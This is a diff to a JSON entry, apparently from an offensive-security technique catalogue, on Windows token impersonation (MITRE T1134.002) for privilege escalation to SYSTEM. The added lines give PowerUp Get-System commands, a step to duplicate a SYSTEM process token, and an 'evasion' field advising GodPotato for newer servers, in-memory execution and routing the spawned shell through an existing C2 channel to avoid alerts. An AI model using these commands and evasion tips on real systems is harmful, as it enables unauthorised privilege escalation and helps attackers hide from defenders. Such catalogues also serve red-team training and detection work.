@@ -80,6 +80,27 @@
     "sources": [
       "HTB M26",
       "MITRE T1134.002"
-    ]
-  }
+    ],
+    "evasion": "Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet — the noisy part is the spawned shell, so route it through an existing C2 channel."
+  },
+  "variations": [
+    {
+      "label": "Get-System via named pipe (PowerUp)",
+      "command": "Get-System -Technique NamedPipe"
+    },
+    {
+      "label": "Token duplication (PowerUp)",
+      "command": "Get-System -Technique Token"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Confirm SeDebug/SeImpersonate",
+      "command": "whoami /priv"
+    },
+    {
+      "label": "Duplicate a SYSTEM process token to spawn SYSTEM",
+      "command": "[MyProcess]::CreateProcessFromParent(<system_pid>,<command>)"
+    }
+  ]
 }
